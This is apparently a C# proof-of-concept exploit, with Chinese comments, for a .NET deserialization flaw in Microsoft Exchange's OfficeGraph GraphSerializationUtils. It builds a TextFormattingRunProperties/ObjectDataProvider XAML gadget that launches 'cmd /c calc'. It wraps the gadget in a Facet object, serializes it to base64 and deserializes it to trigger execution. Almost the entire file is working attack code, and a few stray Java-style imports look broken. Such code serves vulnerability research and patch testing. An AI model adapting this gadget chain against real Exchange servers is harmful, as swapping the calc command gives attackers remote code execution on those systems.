using com.sun.corba.se.impl.corba;
using java.util;
using Microsoft.VisualStudio.Text.Formatting;
using Newtonsoft.Json;
using Newtonsoft.Json.Bson;
using Newtonsoft.Json.Linq;
using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Reflection;
using System.Runtime.Serialization;

class Program
{
    [Serializable]
    public class TextFormattingRunPropertiesMarshal : ISerializable
    {
        protected TextFormattingRunPropertiesMarshal(SerializationInfo info, StreamingContext context)
        {
        }

        string _xaml;
        public void GetObjectData(SerializationInfo info, StreamingContext context)
        {
            info.AddValue("ForegroundBrush", _xaml);
        }
        public TextFormattingRunPropertiesMarshal(string xaml)
        {
            _xaml = xaml;
        }
    }

    static void Main()
    {
        // 加载相关方法和类型
        var asm1 = Assembly.LoadFrom(@"C:\\Users\\Administrator\\Desktop\\dll\\Microsoft.Exchange.OfficeGraph.GrainTransactionStorage.dll");
        var asm2 = Assembly.LoadFrom(@"C:\\Users\\Administrator\\Desktop\\dll\\Microsoft.Exchange.OfficeGraph.Common.dll");
        var GraphSerializationUtils = asm1.GetType("Microsoft.Exchange.OfficeGraph.GrainTransactionStorage.GraphSerializationUtils");
        var Facet = asm2.GetType("Microsoft.Exchange.OfficeGraph.Common.Facet");

        // 构造 payload
        string payloadxml = "<?xml version=\"1.0\" encoding=\"utf-16\"?>\r\n<ObjectDataProvider MethodName=\"Start\" IsInitialLoadEnabled=\"False\" xmlns=\"http://schemas.microsoft.com/winfx/2006/xaml/presentation\" xmlns:sd=\"clr-namespace:System.Diagnostics;assembly=System\" xmlns:x=\"http://schemas.microsoft.com/winfx/2006/xaml\">\r\n  <ObjectDataProvider.ObjectInstance>\r\n    <sd:Process>\r\n      <sd:Process.StartInfo>\r\n        <sd:ProcessStartInfo Arguments=\"/c calc\" StandardErrorEncoding=\"{x:Null}\" StandardOutputEncoding=\"{x:Null}\" UserName=\"\" Password=\"{x:Null}\" Domain=\"\" LoadUserProfile=\"False\" FileName=\"cmd\" />\r\n      </sd:Process.StartInfo>\r\n    </sd:Process>\r\n  </ObjectDataProvider.ObjectInstance>\r\n</ObjectDataProvider>";
        TextFormattingRunPropertiesMarshal payload = new TextFormattingRunPropertiesMarshal(payloadxml);

        var facetName = "facetName";
        var properties = new Dictionary<string, object>
        {
            { "p1",  payload}
        };
        var ctor = Facet.GetConstructor(new Type[] { typeof(string), typeof(IDictionary<string, object>) });
        var facetInstance = ctor.Invoke(new object[] { facetName, properties });

        Array facetArray = Array.CreateInstance(Facet, 1);
        facetArray.SetValue(facetInstance, 0);

        var test = (IDictionary)Activator.CreateInstance(typeof(Dictionary<string, object>));
        test["key"] = facetArray;

        // 调用 GraphSerializationUtils.ToByteArray<Dictionary<string, object>>(IDictionary test)
        var method = GraphSerializationUtils.GetMethod("ToByteArray");
        var constructed = method.MakeGenericMethod(typeof(Dictionary<string, object>));
        var result = (byte[])constructed.Invoke(null, new object[] { test });
        Console.WriteLine(Convert.ToBase64String(result));
        Console.WriteLine(typeof(TextFormattingRunProperties).FullName);

        // 调用 GraphSerializationUtils.FromByteArray< Dictionary<string. object> >(byte[] result)
        var method2 = GraphSerializationUtils.GetMethod("FromByteArray");
        var genericMethod = method2.MakeGenericMethod(typeof(Dictionary<string, object>));
        var result2 = genericMethod.Invoke(null, new object[] { result });
    }
}
